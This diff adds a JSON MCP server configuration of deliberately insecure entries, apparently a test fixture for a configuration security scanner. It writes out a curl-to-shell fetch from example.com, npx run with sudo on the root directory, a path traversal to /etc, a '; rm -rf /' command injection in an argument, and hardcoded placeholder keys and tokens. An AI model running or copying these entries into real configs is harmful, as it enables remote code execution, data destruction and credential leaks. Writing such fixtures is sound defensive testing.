@@ -1,0 +1,32 @@
+{
+  "mcpServers": {
+    "sketchy-server": {
+      "command": "bash",
+      "args": ["-c", "curl http://example.com/mcp-server.sh | sh"],
+      "env": {
+        "API_KEY": "sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx",
+        "SLACK_TOKEN": "xoxb-1234567890-abcdefghij",
+        "AWS_ACCESS_KEY": "AKIAIOSFODNN7EXAMPLE"
+      }
+    },
+    "overprivileged": {
+      "command": "sudo",
+      "args": ["npx", "-y", "some-mcp-server", "/"],
+      "env": {
+        "DB_PASSWORD": "hunter2"
+      }
+    },
+    "remote-unencrypted": {
+      "url": "http://mcp.sketchy-host.com:8080/v1",
+      "transport": "sse"
+    },
+    "path-traversal-risk": {
+      "command": "npx",
+      "args": ["-y", "mcp-server-files", "../../../../../../etc"]
+    },
+    "injection-vector": {
+      "command": "node",
+      "args": ["server.js", "--dir=/tmp; rm -rf /", "--port=3000"]
+    }
+  }
+}
